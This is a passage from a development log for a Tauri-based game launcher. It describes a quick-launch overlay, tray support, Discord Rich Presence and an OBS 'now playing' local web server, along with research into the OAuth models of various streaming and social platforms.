already looking at Playnite's window). Steam has nothing equivalent (Shift+Tab's overlay
requires a game already running). This distinction - dedicated OS window vs. in-app modal -
became the first real decision point, resolved with the user in favor of the dedicated window,
matching Playnite's actual precedent rather than the weaker in-app-modal alternative.

That decision had a consequence the milestone didn't originally scope: a dedicated overlay
window is only actually useful if it survives the main window closing, and this app had no tray
support at all - closing (X) quit the whole process. Surfaced this explicitly rather than
silently building a "dedicated overlay" that only worked while the main window happened to be
open anyway (no better than the in-app-modal alternative it was chosen over). User opted to add
tray support as part of this milestone.

**Rust.** New `tray.rs`: `TrayIconBuilder` with a Show/Quick Launch/Quit menu (reuses
`app.default_window_icon()`, no new asset), left-click shows+focuses the main window.
`CloseToTrayState(Mutex<bool>)` (Tauri-managed, defaults `true`) is read synchronously from the
main window's `WindowEvent::CloseRequested` handler (`install_close_to_tray_handler`) -
`api.prevent_close()` + `.hide()` instead of quitting, whenever the flag is set; the tray's own
Quit item calls `app.exit(0)` directly, bypassing this. The flag has to be a synchronous
in-memory value (not an async DB read) since `CloseRequested` fires synchronously - the frontend
(`appSettings.ts`) mirrors the real persisted setting into it via `set_close_to_tray`, both on
every toggle and once during its own `init()`, accepting a small window right at startup where
Rust's own default is used before the frontend's near-instant init has run (a user can't
physically click the close button before that resolves).

New `quick_launch.rs`: registers `tauri-plugin-global-shortcut` with a handler that
unconditionally toggles the overlay on `ShortcutState::Pressed` - only one shortcut is ever
registered at a time (swapped via `register_hotkey`, never added alongside a second one), so the
handler doesn't need to disambiguate which shortcut fired. The overlay itself is a
`WebviewWindow` (label `quick-launch`, `decorations(false)`/`always_on_top(true)`/
`skip_taskbar(true)`/`resizable(false)`, centered on the primary monitor - cursor-aware
multi-monitor placement deliberately deferred, not blocking) created once on first toggle and
reused (hidden/shown) thereafter, not recreated per press. Hides on `WindowEvent::Focused(false)`
(clicking away), matching the Spotlight/Alfred/Playnite convention. A `quick-launch-shown` event
is emitted on every show (not just creation) since a plain `show()` doesn't reliably hand
keyboard focus to the webview's own input element - `QuickLaunchOverlay.vue` listens for it to
clear/refocus its search input every time.

`capabilities/quick-launch.json` is scoped deliberately minimal, since this window is reachable
via a global hotkey regardless of the app's own focus state: `core:default` + only the
`core:window:*` ops the overlay itself needs, `sql:default`/`allow-select`/`allow-load` (read-
only - the overlay never writes), `opener:default` + the same URL allowlist `default.json` has
(needed since it reuses `library.ts`'s real `launchGame`, URI branches included). No
`sql:allow-execute`, no `updater:*`/`process:*` - none of that applies here. Custom app-defined
commands (`launch_game`, `set_quick_launch_hotkey`, `hide_quick_launch`, etc.) aren't gated by
the capability system at all - only official Tauri/plugin commands are - so none of those needed
explicit permission entries either.

**Frontend.** No `vue-router` exists anywhere in this project, so the overlay isn't a route
inside the main SPA - it's a second Vite build entry (`quick-launch.html`/`src/quickLaunch.ts`,
its own `createApp`/Pinia instance, `vite.config.ts`'s `build.rollupOptions.input`), keeping its
own load fast since it needs to feel instant on hotkey press. `QuickLaunchOverlay.vue` uses the
real `useLibraryStore()` and calls `library.launchGame(game)` directly rather than
re-implementing any launch logic - one code path, not two that could drift, same reasoning
already applied to the batch-ops selection UI back in Milestone 25.

Fuzzy matching is a small in-house subsequence scorer (`src/utils/fuzzyMatch.ts`) rather than a
dependency like Fuse.js - this only ever needs to score game titles (a few hundred entries at
most), not worth pulling in a library for. Consecutive-run and start-of-string matches score
higher, matching the usual Spotlight/Alfred fuzzy-finder intuition.

Results aren't rendered all at once - `visibleCount` grows by `BATCH_SIZE` (8) as `.results`
scrolls near its bottom, or via arrow-key navigation past the last rendered row, against the
full uncapped match set (`allMatches`). Already-rendered rows never unmount on scroll-back-up,
so there's no separate "previous batch" mechanism - whatever loaded stays loaded. Resets on
every new search and on every `quick-launch-shown` event. A post-render top-up call
(`loadMoreIfNeeded()` right after the initial batch renders) handles the edge case where the
first batch doesn't actually overflow the results container (a short list, or an unusually tall
window) - without it there'd be no scrollbar to ever trigger the `@scroll` handler at all,
silently stranding the rest of the matches unreachable.

Two post-ship fixes, both real bugs found via user testing:
- The overlay never called `theme.init()` - it's a separate window with its own DOM, so it never
  inherited the main window's theme application at all and was silently stuck on default
  Catppuccin Latte tokens regardless of what was actually selected. Fixed by calling
  `theme.init()` on every show (not just once on mount) - the overlay window is created once and
  reused rather than recreated per toggle, so a theme changed while it was hidden needs to be
  picked up the next time it opens, not just at first launch.
- `.result` rows weren't reliably left-aligned - added explicit `justify-content: flex-start` +
  `width: 100%` rather than relying on implicit flex-item stretch/button default behavior.

Settings gained a "Quick Launch" section: a hotkey recorder (`listeningForHotkey`, mirrors
`GamepadRemapSettings.vue`'s established "listen for the next input" interaction pattern, reused
for keyboard capture instead of gamepad input - `event.code`, not `event.key`, since it matches
the same key-code naming the Rust-side `Code` enum from the `keyboard-types` crate already uses,
so the accelerator string built in JS needs no translation layer to be valid on the Rust side)
and a "Close to tray" checkbox. New `quickLaunch.*`/`settings.quickLaunch*`/`settings.closeToTray`
i18n keys across all 10 locales.

Also styled the results list to pick up `--content-background` (same token/fixed-attachment
technique as the main window's sticky bars from Milestone 25's earlier work, falling back to
`--color-mantle` for themes without a pattern) - and, unrelated to this milestone but found while
testing it, fixed `--background-sticky`'s own fallback in `styles.css`: it fell back to
`transparent` instead of `--color-base`, so every theme except Arc Raiders (the only one that
actually sets `--content-background`) left the main window's sticky bars fully transparent,
showing scrolled rows through underneath instead of an opaque bar matching the page.

Two more post-ship fixes, found via user testing after tagging v2.1.0:
- Exiting the app via the tray's Quit item printed a benign but noisy Windows console warning
  ("Failed to unregister class Chrome_WidgetWin_0. Error = 1412") - `app.exit(0)` alone races
  WebView2's own teardown for windows that are merely hidden rather than destroyed (the main
  window when closed-to-tray, and the quick-launch overlay itself, created once and left alive
  on hide rather than torn down each toggle). Fixed by explicitly `.destroy()`-ing every open
  window (not `.close()`, which the main window's own close-to-tray handler would just intercept
  and re-hide) before calling `app.exit(0)`.
- `.result` rows in the overlay weren't reliably left-aligned - a plain `<button>`'s UA default
  and implicit flex-item sizing weren't enough; added explicit `justify-content: flex-start` +
  `width: 100%`.

## Milestone 28 — Discord Rich Presence

Scoped as a built-in feature, not a plugin, after directly discussing the tradeoff with the user
mid-implementation. The milestone's own text had left "new plugin kind vs. built-in feature" as
an open question; walked through why: Discord Rich Presence has exactly one real target (there's
only ever one Discord client to report to), unlike source/metadata-provider's genuine multi-enable
need. A `presence` plugin kind only becomes worth building once a second real target exists
(Slack custom status, Twitch stream title/category, a generic "now playing" webhook for OBS
overlays, or Steam's own custom rich-presence string) - captured as its own Milestone 29 rather
than built speculatively now, and the milestone numbering from the old 29 onward shifted by one
to make room for it.

**The client_id question, worked through with the user in real time.** The user asked whether a
single hardcoded Discord Application `client_id` (created once by the maintainer) has the same
"safe to share" property IGDB's Twitch `client_id` seems to, given the metadata providers
already require per-user API keys/secrets. Walked through the actual distinction rather than
assuming it: Discord Rich Presence is pure local IPC to whatever Discord client is already
logged in on the *same machine* - no network round-trip, no authentication step at all in the
traditional sense, since being a local process able to open the named pipe *is* the trust
boundary. `client_id` there is just a label (which app's name/icon to show), carries no
authority, and is transmitted openly on every normal use anyway - leaking it changes nothing.
IGDB's flow (Twitch OAuth Client Credentials grant) is server-to-server: Concourse has to prove
"I am this registered application" to Twitch's servers over the open internet, and
`client_secret` is exactly what proves that - anyone holding it can mint tokens and act as the
app from anywhere, consuming its rate limit, indefinitely. That's why IGDB's secret can't be
shared but Discord's `client_id` can - the security model, not the field name, is what differs.
(Aside, also discussed: a hypothetical future Twitch presence plugin *could* get the same
"safe to hardcode" property Discord has, if built on Twitch's Authorization Code + PKCE flow
instead of Client Credentials - PKCE is specifically designed for public/native clients that
can't protect a secret, authenticates each user against their *own* account/rate limit rather
than the app's shared one, same shape as Discord's "local session already belongs to the real
user" trust model just achieved differently. Not implemented - noted for Milestone 29 if a
Twitch presence target is ever actually built.)

Conclusion: one shared `client_id`, hardcoded by the maintainer once, same as literally every
other real app with Discord Rich Presence (Spotify, VS Code, Steam-integrated games) - asking
every Concourse user to create their own Discord Application would be pure friction with zero
corresponding benefit, since there's no shared-quota resource being protected the way there is
for IGDB. `discord_presence.rs`'s `DISCORD_CLIENT_ID` constant is a placeholder pending the user
actually registering one - the whole feature is otherwise fully implemented and build-verified,
but genuinely inert (every `connect()` call fails, silently, exactly as designed) until that's
swapped in. Milestone stays open until then.

**Rust (`src-tauri/src/discord_presence.rs`, new module).** `discord-rich-presence` crate
(`DiscordIpc` trait: `connect`/`set_activity`/`clear_activity`/`close`). `DiscordPresenceState`
(Tauri-managed, `Mutex<Option<DiscordIpcClient>>`) is lazily connected on first use and reused
across launches rather than reconnecting every time - `None` both before the first attempt and
after any failed/dropped connection, so every call site quietly no-ops (the milestone's own
"Discord not running" requirement) instead of erroring. If a `set_activity`/`clear_activity` call
itself fails (a live connection gone stale - e.g. Discord was closed mid-session), the state is
cleared back to `None` so the *next* call attempts a fresh reconnect instead of failing silently
forever against a dead client - simple self-healing without any explicit reconnect-retry loop.

**Lifecycle wiring, launcher.rs.** Both `launch_game` (direct executables) and
`track_folder_playtime` (URI/wrapper-launched games, which fall through to the same folder-based
tracking regardless of which of the four other `launchGame()` branches got there - GOG/Xbox
pseudo-URI, real URI, or compatibility wrapper all funnel into this one call already) gained
`title: String`/`discord_presence_enabled: bool` parameters. Set on confirmed launch (immediately
after spawn for `launch_game`; after Phase 1's "game actually started" detection for
`track_folder_playtime`, not immediately on command call, since URI launches invoke it right
after `openUrl()` fires - before the game window necessarily even exists), cleared alongside the
existing `game-session-ended` emit in both. This is the same integration point playtime tracking
itself already uses - two commands, not scattered across every launch branch individually.

**Frontend.** `library.ts`'s `launchGame()` computes `discordPresenceEnabled` once per call
(`appSettings.discordPresenceEnabled && game.skip_discord_presence !== 1`) and passes it plus
`game.title` into whichever of the two invoke calls actually ends up firing - single source of
truth, no duplicated enablement logic per branch. New `skip_discord_presence` column (migration
v6) mirrors `skip_dedup`'s exact existing shape (SQLite boolean, `GameEditFields`, `games.ts`'s
`update()`, `GameDetail.vue`'s edit-mode checkbox) - a per-game opt-out alongside the global
Settings toggle (`appSettings.ts`'s `discordPresenceEnabled`, default `true` - opt-out model,
matching how Rich Presence itself normally defaults on for supporting apps). New
`settings.discordPresence`/`gameDetail.skipDiscordPresence` i18n keys across all 10 locales.

## Milestone 29 — Presence Plugin Type

No implementation yet - this entry records the platform research done while scoping which
second target (beyond Discord) is actually worth building against, before committing to any
interface design. Same evaluation lens applied to every candidate: does it need a real
`client_secret` (per-user credential friction, the IGDB problem) or is it safe to hardcode/auth-
free (the Discord `client_id` situation)? Getting this wrong for the *second* target would mean
designing `PresencePlugin`'s interface around one auth model, then having to rework it once a
genuinely different one (per-user OAuth secrets) showed up - worth settling before writing code.

**Chzzk (치지직).** Real Open API exists (`chzzk.gitbook.io`) with `Live` endpoints for stream
title/category updates - structurally similar to what a Twitch presence plugin would do.
Confirmed via their own authorization docs, though: the token exchange (`POST /auth/v1/token`)
requires `clientId` **and** `clientSecret`, no PKCE support anywhere in the docs, and no mention
of desktop/native app support at all - every example is oriented at server-backed web apps that
can keep a secret. Same problem as IGDB: either every user registers their own Naver Developer
Center app (real per-user friction), or Concourse runs a server-side proxy holding the secret
(real backend infrastructure, well outside "local desktop app").

**Twitch.** Confirmed Twitch supports Authorization Code + PKCE, the flow specifically designed
for public/native clients that can't protect a secret - the user authenticates via Twitch's own
login/consent screen, and the resulting token is scoped to *their* account and rate limit, not a
shared app-wide identity the way IGDB's Client Credentials grant works. Best candidate found so
far on the "safe to hardcode `client_id`, no per-user friction" axis - same trust shape Discord's
local-IPC model has, just achieved via OAuth instead of a local pipe.

**Steam Rich Presence - dropped, not viable.** `ISteamFriends::SetRichPresence` must be called
by a process that has initialized the Steamworks API under a real, registered Steam App ID (via
`steam_appid.txt`/`SteamAPI_Init`) - it's designed to be called by the game itself, not injected
by an external launcher for arbitrary games it doesn't own. Concourse has no Steam App ID of its
own (it isn't published on Steam), and impersonating another game's App ID isn't a real option.
Correctly ruled out rather than left as a vague "maybe" in the candidate list.

**YouTube - parked, genuinely ambiguous.** Google's own documentation conflicts with itself on
whether a "Desktop app" credential type's `client_secret` is safe to hardcode: the older "OAuth
2.0 for Installed Applications" guide states outright that the secret "is obviously not treated
as a secret" for installed apps, but the current "OAuth 2.0 for iOS & Desktop Apps" reference
still calls it a secret, marks it "Optional" in the token exchange (the "not applicable" carve-
out is explicitly stated only for Android/iOS/Chrome client types, not Desktop), and doesn't
clearly confirm PKCE alone suffices for refresh-token requests specifically (which any
long-running session beyond the ~1hr access-token lifetime would need). Not confidently resolved
either way from documentation alone - would need testing against a real Desktop-type credential
before trusting it the way Twitch's PKCE flow is trusted.

**Slack.** Initially assumed to share Chzzk's confidential-client shape (wrong guess, corrected
after actually checking) - Slack's own docs confirm PKCE support, and enabling it marks the app
as a "public client": the token exchange (`oauth.v2.access`) then sends `code_verifier` instead
of `client_secret`, not alongside it. Genuinely secret-free, same safe-to-hardcode shape as
Twitch. One real wrinkle: enabling PKCE is a one-way app setting (can't be turned back off
without contacting Slack support), and refresh tokens issued under PKCE expire in 30 days
instead of lasting indefinitely - a minor ongoing-maintenance cost, not a blocker.

**Kick.** Uses OAuth 2.1 with PKCE for its user-token flow, which looked promising by name alone
- but confirmed via Kick's own dev docs that the token exchange requires `client_secret`
**and** `code_verifier` together (`code, client_id, client_secret, redirect_uri, grant_type,
code_verifier`), not one or the other. PKCE here is additive security on top of a still-
confidential client, not a substitute for the secret the way it is for Twitch/Slack - same
per-user-credential friction as Chzzk despite the modern-looking OAuth 2.1 branding. Worth
noting as a pattern: "uses PKCE" alone doesn't guarantee "doesn't need a secret" - each provider
has to be checked for whether PKCE actually *replaces* the secret requirement or just sits
alongside it.

**Telegram.** No ambient-status concept exists in Telegram at all - the only realistic shape is
"message myself via a bot when a game starts," a personal-notification utility rather than a
status visible to others, different purpose from every other candidate here. Auth is a bot
token from @BotFather (`/newbot`, instant, no formal app registration or review) - a per-user
credential the user has to create and paste in, same shape as IGDB's API key, just dramatically
lower friction to obtain than a real OAuth app registration.

**X (Twitter) - ruled out on cost, not auth.** OAuth 2.0 with PKCE is genuinely supported for
posting (`tweet.write` scope, standard authorization-code-with-PKCE flow to `x.com/i/oauth2/
authorize`) - the auth model itself isn't the blocker here. The free API tier was fully retired
for new developers as of February 2026; posting is now pay-per-use only ($0.01 per post
created), with the old free/Basic/Pro tiers grandfathered for existing subscribers only. Not
viable for a feature meant to work out of the box for every user without asking them to pay per
status update - dropped on cost, unlike every other candidate here which was evaluated purely on
auth friction.

**Bluesky (AT Protocol).** The strongest candidate found after Discord/Twitch/Slack. AT
Protocol OAuth explicitly classifies native/desktop apps as "Public" clients "Forbidden" from
using a `client_secret` - authentication instead relies on PKCE plus DPoP (Demonstrating Proof
of Possession, a non-exportable cryptographic keypair bound to the specific device/install).
Genuinely no shared secret anywhere in the flow. The real wrinkle: `client_id` itself must be a
fully-qualified `https://` URL pointing to a publicly-hosted JSON client-metadata document (the
protocol validates the client by fetching and checking that document), not just an opaque
string - Concourse would need to host that file somewhere public. The existing GitHub Pages docs
site is a natural fit for this (already serving static content at a stable URL), so this is a
small addition, not a real blocker - just more moving parts than Twitch/Slack's plain PKCE flow.

**Mastodon/Fediverse - still not researched in depth.** Likely sidesteps the OAuth-secret
problem entirely via manual per-instance personal access tokens, the way most desktop Mastodon
clients already work - complicated by federation meaning there's no single API to register
against, unlike every centralized platform researched so far.

**Home Assistant / local smart-home webhook - still not researched.** Same zero-external-auth
category as the OBS idea below, different audience (home-automation users rather than
streamers/chat users).

**Local/self-hosted, no external auth at all.** A "now playing" webhook Concourse serves locally
for OBS's own Browser Source to point at - no OAuth, no account, no secret of any kind, since
nothing ever leaves the local machine. Structurally the simplest candidate by far precisely
because it avoids this entire class of problem - worth treating as the likely first real
`PresencePlugin` implementation once that interface actually gets built, rather than waiting on
Twitch/Chzzk's auth questions to fully resolve first.

Telegram (researched later) and Home Assistant (my own speculative suggestion) were both
dropped on direct feedback rather than technical merit - Telegram's only ambient-status feature
(Emoji Status) is emoji-only, can't show an actual game title; Home Assistant had no real use
case behind it. Neither made it into the "candidate platforms" list kept in milestones.md.

**Implementation.** Two real targets (Discord + OBS webhook, both confirmed safe-to-hardcode/
auth-free) was the trigger this milestone's own text had named for actually building the kind,
rather than more speculative architecture for one implementation.

New `PresencePlugin` interface (`types.ts`): `activate(gameTitle)`/`deactivate()`, deliberately
minimal - mirrors the launch-lifecycle hook Milestone 28 already had, just moved into the
standard plugin shape. `"presence"` added to `manifest.ts`'s `PLUGIN_KINDS` array (everything
else - `PluginKind`, `isPluginManifest`'s Set check - already derives from it).

The real architectural change was decoupling `launcher.rs` from presence entirely.
Milestone 28's `launch_game`/`track_folder_playtime` took a `title`/`discord_presence_enabled`
parameter pair and called `discord_presence::set_presence`/`clear_presence` inline - fine for
one hardcoded target, wrong shape for a real plugin kind (`launcher.rs` doesn't know source/
theme/metadata plugins exist either). Both commands dropped `discord_presence_enabled` and
instead emit a new `"game-session-started"` event (`{ game_id, title }`) at the exact same two
points presence used to fire - immediately after spawn in `launch_game`, immediately after
Phase 1's "actually running" detection in `track_folder_playtime` (not on command call, which
fires right after `openUrl()` - before the game window necessarily exists; this precision is
why it's a new Rust event rather than moving "when did it start" logic into JS, which has no
equivalent signal). `title` stayed as a parameter (still needed for the event payload).

`discord_presence.rs`'s `set_presence`/`clear_presence` functions are byte-for-byte unchanged -
they just gained real `#[tauri::command]` wrappers (`set_discord_presence`/
`clear_discord_presence`) so the new `discord-presence` TS plugin (`src/plugins/discord-presence/`)
can invoke them directly instead of `launcher.rs` calling them inline.

New `src-tauri/src/obs_presence.rs`: `tiny_http` (sync, no async runtime - matches this
codebase's existing thread-based style rather than pulling in a second HTTP stack alongside
`reqwest`) serving a single auto-refreshing HTML page at `/` on a fixed port (47474, not user-
configurable yet), reading from `Mutex<Option<String>>` managed state. Starts once in `.setup()`
and stays up for the app's whole lifetime, completely decoupled from whether the OBS plugin is
enabled - `activate`/`deactivate` (via a `set_now_playing(title: Option<String>)` command) only
ever change *what the already-running server reports*, never whether it's listening. Takes
`AppHandle` (not a raw `&'static` state reference) and re-fetches `ObsPresenceState` per
request, matching how this codebase's other background threads (`launcher.rs`, `quick_launch.rs`)
already cross thread boundaries - a first attempt at a literal `&'static` reference to the
managed struct would have fought Tauri's own state lifetime.

New `src/stores/presence.ts` mirrors `wrapperPlugins.ts`'s `Set<string>` multi-enable shape
(order doesn't matter here, unlike metadata's provider-priority list) - own `listen()` calls for
both `game-session-started` (new) and `game-session-ended` (existing), separate from
`library.ts`'s own `game-session-ended` listener (which records playtime) since activation and
playtime tracking are genuinely different concerns that happen to key off the same two events.
`activateAll`/`deactivateAll` run every enabled plugin's call via `Promise.all` with each
individually `.catch(() => {})`-guarded - one plugin throwing (Discord not running, say)
shouldn't stop the others, same "one bad provider doesn't block the rest" reasoning
`metadataProviders.ts`'s `fetchMetadata` already uses. `library.ts`'s `launchGame()` lost the
`discordPresenceEnabled` computation entirely - that responsibility moved to `presence.ts`'s own
event listeners, so `launchGame()` just calls `launch_game`/`track_folder_playtime` with
`gameId`/`executablePath`/`title` or `gameId`/`installDir`/`title`, same shape as any other
command it calls.

Per-game opt-out generalized: `skip_discord_presence` renamed to `skip_presence` (migration v7,
a real `ALTER TABLE ... RENAME COLUMN`, not a new column plus a dead old one - preserves
existing data). `appSettings.ts`'s global `discordPresenceEnabled` toggle removed entirely -
enablement now goes through the standard multi-enable plugin pattern (the new "Presence" tab in
`PluginSettings.vue`, structurally identical to the existing "wrapper" tab) instead of a
separate ad-hoc Settings checkbox.

Discord defaults enabled on first init (`DEFAULT_PRESENCE_IDS = ["discord-presence"]`),
preserving Milestone 28's original opt-out default now that it's a plugin instead of a
hardcoded feature; OBS stays opt-in like source/metadata plugins, since there's nothing
configured on the OBS side yet for a fresh install.

Manually verified end-to-end: Discord status and the OBS page both update/clear correctly for
both direct-exe and URI-launched games, and a game with `skip_presence` set is correctly
excluded from both plugins.

### OBS webhook follow-up: cover art + live elapsed-time counter

First of the "OBS webhook follow-ups, stretch" sublist, picked as the smallest lift. Replaced
the overlay's title-only static text with a cover-art image and a ticking elapsed-time display.

`ObsPresenceState`'s inner type went from `Option<String>` (just the title) to
`Option<NowPlaying>` (`title`, `cover_url`, `started_at: u64` unix seconds). `set_now_playing`
gained a `cover_url` parameter and now decides `started_at` itself: if the incoming title
matches what's already stored, the existing `started_at` is kept (re-activating an
already-running game - e.g. a second enabled presence plugin re-triggering `activateAll` -
shouldn't reset the clock); a genuinely new title gets `now_unix()`.

Elapsed time is computed client-side, not server-side. `render_page` embeds `started_at` as a
`data-started` attribute on an `.elapsed` span; a small inline `<script>` in the served page
runs a `setInterval` every second computing `Date.now()/1000 - started` and formatting it as
`M:SS`/`H:MM:SS`. This is why the page's own `<meta http-equiv="refresh">` interval could widen
from 3s to 15s - it used to be the only thing making the display look "live" at all, now it's
only responsible for picking up an actual title/cover change, not driving the clock.

`PresencePlugin.activate()`'s signature widened to `activate(gameTitle: string, coverArtUrl?:
string | null)` - optional, since Discord's current Activity setup doesn't use an image and has
no reason to care. `presence.ts`'s `activateAll` now takes and forwards a `coverArtUrl` param,
sourced from `game.cover_art_url` in the `game-session-started` listener; `obs-presence`'s
`activate` passes it through to `set_now_playing`, `discord-presence`'s `activate` still only
takes one argument - TypeScript's structural typing lets a narrower implementation satisfy an
interface with extra optional parameters, no change needed on the Discord side.

One real Rust borrow-checker fix along the way: `start()`'s per-request handler originally
chained `app.state::<ObsPresenceState>().0.lock().unwrap()` directly, which dropped the
temporary `State<'_, T>` mid-expression (E0716). Fixed by binding `app.state::<...>()` to a
named `let` first, then locking on a separate line.

Investigated separately (not a bug in this feature): a report that the overlay only seemed to
update "when the main app window gets focus." Traced through - both `game-session-started` and
`game-session-ended` fire via `app.emit` from plain background OS threads (`launcher.rs`), no
window/focus dependency at all, and `presence.ts`'s `listen()` handlers should receive them
regardless of window state. Considered (but didn't build, since the report turned out to be a
false alarm) moving OBS's state update into Rust directly - `obs_presence.rs` registering its
own `app.listen_any` handler instead of going through the frontend webview - which would have
required a second, Rust-side SQLite read for the `skip_presence` check (no `sqlx`/`rusqlite`
pool exists on the Rust side today; `tauri-plugin-sql` is JS-only in this codebase). Turned out
unnecessary: real cause was `track_folder_playtime`'s existing Phase-2 grace period
(`POLL_INTERVAL` 3s × `MISSING_GRACE_POLLS` 2 = up to ~6s after the game actually closes before
`game-session-ended` fires, by design, to survive a brief launcher-relay handoff) - confirmed by
the user timing a real OBS test at ~6s, matching exactly. No focus/webview-throttling bug
exists; no code change made for it.

### OBS webhook follow-up: raw JSON `/status` endpoint

Second stretch item. `obs_presence.rs`'s request loop now branches on `request.url()`: a GET to
`/status` returns a `NowPlayingStatus` struct (`title`, `cover_url`, `started_at`, each
`Option`-typed - `None` across the board when idle) serialized via `serde_json`; anything else
falls through to the existing `render_page` HTML response, unchanged. `serde_json` and `serde`'s
`Serialize` derive were already dependencies (used elsewhere in the Rust backend), no new crate
needed - `tiny_http`'s `Method`/`Server` request/response plumbing is the only new import.

`ObsPresenceSettings.vue` surfaces both URLs now (`http://localhost:47474/` for the built-in
overlay, `http://localhost:47474/status` for custom-overlay builders), one hint line each, new
`obsPresence.statusHint` i18n key added across all 10 locales alongside the existing `hint` key.

No `ObsPresenceState`/`set_now_playing` changes needed - both endpoints read the same
`Mutex<Option<NowPlaying>>` snapshot already in place from the previous follow-up, just rendered
two different ways depending on the request path.

### OBS webhook follow-up: configurable, testable port + URLs moved into a modal

Not one of the original four stretch items - added ad hoc after the port was still hardcoded to
`47474` and the overlay/status URLs sat as always-visible inline text in the Presence settings
row.

`ObsPresenceState` gained a `server: Mutex<Option<Arc<Server>>>` field alongside the existing
`now_playing` one (`PORT` renamed `DEFAULT_PORT`, boot-time fallback only). Per-request handling
was pulled out of `start()` into a standalone `serve(app, server)` function so both the initial
boot-time bind and any later rebind share the exact same routing logic instead of drifting.

New `set_obs_presence_port(app, port)` command: binds the *new* port first, and only swaps it
into `ObsPresenceState`/spawns its serving thread (via `old_server.unblock()` to end the
previous thread's `incoming_requests()` loop) once the bind succeeds - a port already in use by
something else fails loudly without taking down the currently-working overlay. `tiny_http`'s
`Server::unblock()` is exactly the tool for this: it's what makes a thread blocked in
`incoming_requests()` return and exit cleanly, rather than leaking a thread parked on the old
socket forever.

New `test_obs_presence_port(port)` command: a real `reqwest::blocking` GET to
`http://127.0.0.1:<port>/status` (3s timeout), `Ok(())` only on a 2xx response - deliberately a
full HTTP round trip through the actual route, not a bare TCP-connect probe, so a green result
means "the overlay responds correctly," not just "something is listening on that port."
`reqwest::blocking` inside a synchronous `#[tauri::command]` already has precedent in this
codebase (`wasm_plugins.rs`) - Tauri dispatches non-`async fn` commands onto its own blocking
thread pool, so this doesn't fight the async runtime the way calling it from an `async fn`
command would.

Since `tauri-plugin-sql` is JS-only in this codebase (no `rusqlite`/`sqlx` pool held on the Rust
side - same fact established investigating the earlier focus/throttle red herring above), the
Rust server can't read a persisted port for itself at boot. It always starts on `DEFAULT_PORT`;
`presence.ts`'s `init()` gained `applyPersistedObsPort()`, which reads the
`obs_presence_port` setting (if any) and calls `set_obs_presence_port` once per launch to
re-apply it - runs unconditionally at startup (not gated on the OBS plugin being enabled),
documented in-line as a small, deliberate exception to "`presence.ts` doesn't know about
individual presence plugins."

`ObsPresenceSettings.vue` rewritten: the plugin row now shows a single "Configure Overlay"
button instead of always-visible URL text, opening a `BaseModal` (the same shared modal
component `AddGame.vue`/`ConfirmInstall.vue`/etc. already use) containing a port number input,
Apply and Test buttons each with their own idle/busy/success/error status line
(`--color-accent`/`--color-danger`, matching this codebase's existing success/error color
conventions - `ToastContainer.vue`'s `.toast-success` and `styles.css`'s shared `.error-text`),
and the overlay/status URLs (still shown, just inside the modal instead of inline). Apply
persists the port to `settingsRepo` only after `set_obs_presence_port` actually succeeds, so a
failed rebind never leaves a stale/wrong value written to disk.

New i18n keys (`configure`, `modalTitle`, `portLabel`, `apply`, `test`, `close`, `invalidPort`,
`applySuccess`, `testSuccess`) added across all 10 locales alongside the existing `hint`/
`statusHint` keys.

### OBS webhook follow-up: port-config UX fixes + structured errors

Three small fixes found via real testing of the port config/modal feature above, before moving
to the next stretch item:

1. Test button tested `appliedPort` (the last *successfully* applied port), not whatever was
   typed in the field. After a failed Apply, pressing Test silently re-checked the old good port
   and showed a stale "responded successfully" next to a different port number in the input -
   confusing, looked like the failed port had actually worked. Fixed: `testConnection` now
   validates and probes `portInput` directly, and both success messages name the port they
   tested (`applySuccess`/`testSuccess` gained a `{port}` param) so there's no ambiguity about
   which port a message refers to.
2. Reapplying the port already active failed with a real Windows `os error 10048`
   (`WSAEADDRINUSE`) - expected, since `set_obs_presence_port` always binds the *new* port before
   dropping the old one (so a bad port can't take down a working overlay), which guarantees a
   self-collision when "new" and "old" are the same port. Short-circuited client-side: if
   `portInput === appliedPort`, skip the round-trip and show a new `alreadyApplied` success
   message instead of a doomed bind attempt.
3. `set_obs_presence_port`/`test_obs_presence_port` returned flat `String` errors, string-
   formatted in Rust (`format!("Failed to bind port {port}: {e}")`) and shown as-is. Two real
   OS-error cases hit during testing (port 1094 landing in a Windows-reserved dynamic port
   exclusion range → `os error 10013`/`WSAEACCES`; the port-1420-self-collision case above →
   `os error 10048`) surfaced that raw OS error text is itself in the OS's language, not this
   app's i18n - a non-English-Windows user's bug report would show OS text in a language
   inconsistent with the rest of the translated UI around it. Discussed the trade-off explicitly
   (raw code is genuinely useful for real debugging - it's what diagnosed both cases above -
   versus a curated message being friendlier for a first-time user) and landed on a middle
   ground: keep the raw text, but stop making it the *only* thing shown. New `ObsPresenceError`
   enum (`#[derive(Serialize)] #[serde(tag = "kind")]`) with `BindFailed`/`Unreachable`/
   `BadStatus` variants, each carrying the structured fields (`port`, `status`) *and* a `raw:
   String` field for the underlying OS/HTTP text. `ObsPresenceSettings.vue` matches on `kind` to
   build a fully localized headline sentence via i18n (`errorBindFailed`/`errorUnreachable`/
   `errorBadStatus`), with `raw` rendered underneath as a smaller monospace detail line - both
   still on-screen, nothing written to a log file (confirmed no logging infrastructure exists
   anywhere in this codebase yet - only ad hoc `eprintln!`, stdout/stderr only, gone in a release
   build).

Considered doing this consistently across every other `Result<_, String>` command in the
backend (`plugin_installer.rs`/`wasm_plugin_runtime.rs`/`wasm_plugins.rs` alone account for 20+)
but iceboxed it as its own thing - genuinely different failure domains per module (network,
filesystem, zip, wasmtime, Sigstore), real architecture work either as one kitchen-sink enum or
a `thiserror`-style hierarchy, and nothing outside OBS has hit user-facing confusion serious
enough yet to justify it. No `thiserror` dependency added or needed for the OBS case itself -
confirmed this project has hand-rolled this exact pattern (`#[derive(Serialize)]` tagged enum,
`.map_err` at each fallible call) without it before.

### OBS webhook follow-up: presentation options (template + alert-popup mode)

Third of the four original stretch items (only real `obs-websocket` integration remains).

New `OverlayStyle` struct (`template: Template` Minimal/Full, `mode: Mode` Persistent/Alert,
`alert_seconds: u64`) added to `ObsPresenceState` alongside the existing `now_playing`/`server`
fields - deliberately orthogonal to `NowPlaying` ("what's playing" vs. "how it's shown"), so
changing style never touches activation state and vice versa. `render_page` branches on both:
minimal template omits the cover `<img>` and elapsed-time `<div>` entirely (title only), full
template is the existing card unchanged.

Alert mode needed no new server-side "have I already shown this" tracking. The served page's own
script already computes `now - started_at` every second for the elapsed-time display; alert mode
reuses that same clock to toggle a `.faded` CSS class (`opacity: 0`, `transition: opacity 0.5s
ease`) once elapsed seconds cross `alert_seconds`. Because it's derived from a real timestamp
(`started_at`, sent to the page once) rather than any "have I shown this popup yet" flag, it
